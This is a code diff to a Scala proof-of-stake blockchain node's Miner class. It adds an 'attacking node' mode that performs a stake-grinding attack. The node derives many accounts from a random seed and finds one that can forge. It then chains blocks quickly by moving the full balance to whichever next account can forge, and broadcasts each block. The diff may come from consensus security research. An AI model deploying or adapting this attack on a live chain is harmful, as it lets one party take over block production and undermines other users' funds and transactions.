@@ -17,7 +17,8 @@ import scorex.account.PrivateKeyAccount
 import scorex.block.Block
 import scorex.consensus.nxt.NxtLikeConsensusBlockData
 import scorex.transaction.PoSCalc._
-import scorex.transaction.{BlockchainUpdater, CheckpointService, History}
+import scorex.transaction.assets.TransferTransaction
+import scorex.transaction.{BlockchainUpdater, CheckpointService, History, PoSCalc}
 import scorex.utils.{ScorexLogging, Time}
 import scorex.wallet.Wallet
 
@@ -45,6 +46,11 @@ class Miner(
   private lazy val processBlock = Coordinator.processBlock(checkpoint, history, blockchainUpdater, timeService, stateReader, utx, blockchainReadiness, Miner.this, settings) _
 
   private val scheduledAttempts = SerialCancelable()
+
+  private val accounts = {
+    val seed = scorex.utils.randomBytes(64)
+    wallet.privateKeyAccounts().toStream #::: (Stream.iterate(0)(_ + 1) map { Wallet.generateNewAccount(seed, _) })
+  }
 
   private val blockBuildTimeStats = Kamon.metrics.histogram("block-build-time", instrument.Time.Milliseconds)
 
@@ -111,12 +117,71 @@ class Miner(
     }
   }
 
-  def lastBlockChanged(): Unit = if (settings.minerSettings.enable) {
-    log.debug("Miner notified of new block, restarting all mining tasks")
-    scheduledAttempts := CompositeCancelable.fromSet(
-      wallet.privateKeyAccounts().map(generateBlockTask).map(_.runAsync).toSet)
-  } else {
-    log.debug("Miner is disabled, ignoring last block change")
+  def lastBlockChanged(): Unit =
+    if (settings.minerSettings.enable) {
+      if (! settings.minerSettings.enableGrinding) {
+        // regular node
+        log.debug("Miner notified of new block, restarting all mining tasks")
+        scheduledAttempts := CompositeCancelable.fromSet(
+          wallet.privateKeyAccounts().map(generateBlockTask).map(_.runAsync).toSet)
+      } else if (! isGrinding.get()) { // attacking node
+        // find an account with enough balance
+        accounts.find(
+          generatingBalance(stateReader, blockchainSettings.functionalitySettings, _, history.height()) >= PoSCalc.MinimalEffectiveBalanceForGenerator
+        ).map { account =>
+          log.debug(s"### Starting grinding attack with account $account")
+          Task { generateBlock(account, System.currentTimeMillis) }
+        }.map(_.runAsync)
+      }
+    } else {
+      log.debug("Miner is disabled, ignoring last block change")
+    }
+
+  private val isGrinding = new AtomicBoolean(false)
+
+  private def generateBlock(account: PrivateKeyAccount, timestamp: Long): Unit = {
+    val height = history.height()
+    val parent = history.lastBlock.get
+    val balance = generatingBalance(stateReader, blockchainSettings.functionalitySettings, account, height)
+    if (! canForge(account, balance, parent.consensusData, parent.timestamp, timestamp)) {
+      log.debug(s"### $account failed to forge initial block at time $timestamp with balance $balance")
+      generateBlock(account, timestamp+1)
+    } else {
+      isGrinding.set(true)
+      val grandParent = history.parent(parent, 2)
+      val avgBlockDelay = blockchainSettings.genesisSettings.averageBlockDelay
+      val btg = calcBaseTarget(avgBlockDelay, height, parent, grandParent, timestamp)
+      val gs = calcGeneratorSignature(parent.consensusData, account)
+      val consensusData = NxtLikeConsensusBlockData(btg, gs)
+      val fee = 100000
+      val delay = 1000 // ms
+
+      log.debug(s"### $account forges at height $height with balance $balance and target ${parent.consensusData.baseTarget}")
+      val nextTimestamp = timestamp + delay
+      for {
+        nextForger <- accounts.find(canForge(_, balance-fee, consensusData, timestamp, nextTimestamp)).toRight("Cannot determine next forger")
+        tx <- TransferTransaction.create(None, account, nextForger, balance-fee, timestamp, None, fee, Array())
+        _ = log.debug(s"### Adding transfer ${balance-fee} -> $nextForger to new block")
+        block = Block.buildAndSign(Version, timestamp, parent.uniqueId, consensusData, Seq(tx), account)
+        _ = Thread.sleep(delay)
+      } yield processBlock(block, true) match {
+        case Left(err) =>
+          log.warn(s"### Error: ${err.toString}")
+          isGrinding.set(false)
+        case Right(score) =>
+          log.debug(s"### Block ${block.uniqueId} forged, score $score")
+          allChannels.broadcast(LocalScoreChanged(score))
+          allChannels.broadcast(BlockForged(block))
+          generateBlock(nextForger, nextTimestamp)
+      }
+    }
+  }
+
+  def canForge(account: PrivateKeyAccount, balance: Long, prevConsensusData: NxtLikeConsensusBlockData, prevTimestamp: Long, timestamp: Long) = {
+    val h = calcHit(prevConsensusData, account)
+    val eta = (timestamp - prevTimestamp) / 1000
+    val t = BigInt(prevConsensusData.baseTarget) * eta * balance
+    h < t
   }
 
   def shutdown(): Unit = ()
